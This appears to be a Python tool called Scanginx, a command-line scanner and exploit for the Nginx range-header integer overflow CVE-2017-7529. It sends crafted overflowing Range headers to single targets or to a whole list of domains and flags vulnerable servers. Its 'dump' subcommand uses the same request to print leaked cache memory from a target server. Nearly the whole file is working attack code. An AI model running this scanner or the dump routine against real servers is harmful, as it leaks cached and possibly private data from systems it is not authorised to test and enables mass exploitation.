#!/usr/bin/env python3.13
# -*- coding: utf-8 -*-

"""
Scanginx - Scanner for Nginx Remote Integer Overflow Vulnerability (CVE-2017-7529)
"""

import argparse
import json
import pathlib

import requests
from urllib3 import disable_warnings
from urllib3.exceptions import InsecureRequestWarning

disable_warnings(InsecureRequestWarning)


class NginxScanner:
    def __init__(self):
        self.data = {}

    def send_request(self, url: str, headers: dict = None, timeout: float = 8.0) -> requests.Response:
        """Send HTTP request and capture server info"""
        if headers is None:
            headers = {}
        headers.setdefault("User-Agent", "Mozilla/5.0")
        headers.setdefault("Accept-Encoding", "identity")

        response = requests.get(url, headers=headers, timeout=timeout, verify=False)
        self.data["Server"] = response.headers.get("Server", "")
        return response

    def check_vulnerability(self, url: str) -> dict:
        data = {}
        try:
            response = self.send_request(url)
            data["Server"] = response.headers.get("Server", "")

            content_length = int(response.headers.get("Content-Length", 0)) + 623
            range_header = f"bytes=-{content_length},-9223372036854{776000 - content_length}"

            response = self.send_request(url, headers={"Range": range_header})

            if response.status_code == 206 and "Content-Range" in response.text:
                data["Is_Vulnerable"] = "CVE-2017-7529"
                print("Vulnerable to CVE-2017-7529")
            else:
                data["Is_Vulnerable"] = "Not Vulnerable"
                print("Not Vulnerable")

        except Exception as e:
            data["Error"] = str(e)

        return data

    def scan_target(self, target: str) -> dict:
        protocols = ["https://", "http://"]
        original_target = target

        for proto in protocols:
            url = target if target.startswith(proto) else proto + target

            try:
                print(f"Trying: {url}")
                result = self.check_vulnerability(url)
                if result.get("Is_Vulnerable"):
                    return result
            except Exception as e:
                continue

        return {"Error": f"No vulnerability found for {original_target}"}


class NginxDumper:
    @staticmethod
    def dump_cache(url: str) -> None:
        """Dump cached data using the vulnerability"""
        offset = 605
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36",
            "Range": f"bytes=-{len(requests.get(url).content) + offset},-9223372036854775808"
        }
        print(requests.get(url, headers=headers).text)


def main():
    parser = argparse.ArgumentParser(description="Scanginx - Nginx CVE-2017-7529 Scanner")
    subparsers = parser.add_subparsers(dest="command", required=True)

    # Scanner subcommand
    scan_parser = subparsers.add_parser("scan", help="Scan for vulnerability")
    scan_parser.add_argument("--target", help="Target URL/domain/IP")
    scan_parser.add_argument("--output", required=True, help="Output JSON file")
    scan_parser.add_argument("--targets-file", help="Path to file with list of domains (one per line)",
                             default="domains.txt")

    # Dumper subcommand
    dump_parser = subparsers.add_parser("dump", help="Dump cache data")
    dump_parser.add_argument("target", help="Target URL")

    args = parser.parse_args()

    if args.command == "scan":
        scanner = NginxScanner()

        if args.target:
            result = scanner.scan_target(args.target)
            output_file = pathlib.Path(__file__).parent / args.output
            with open(output_file, "w") as jf:
                json.dump(result, jf, indent=2)

            print("\n----RESULTS----")
            print(json.dumps(result, indent=2))

        if args.targets_file:
            with open(args.targets_file, "r") as f:
                targets = [line.strip() for line in f if line.strip()]

            all_results = []
            for target in targets:
                print(f"\nScanning: {target}")
                result = scanner.scan_target(target)
                all_results.append(result)

            output_file = pathlib.Path(__file__).parent / args.output
            with open(output_file, "w") as jf:
                json.dump(all_results, jf, indent=2)

            print("\n----RESULTS----")
            print(json.dumps(all_results, indent=2))
        else:
            print("Send me a target: file or simple (domain/url/ip_v4)")

    elif args.command == "dump":
        print("+-+-+-+-+-+-+"
              "|D|u|m|p|e|r|"
              "+-+-+-+-+-+-+")
        NginxDumper.dump_cache(args.target)


if __name__ == "__main__":
    main()
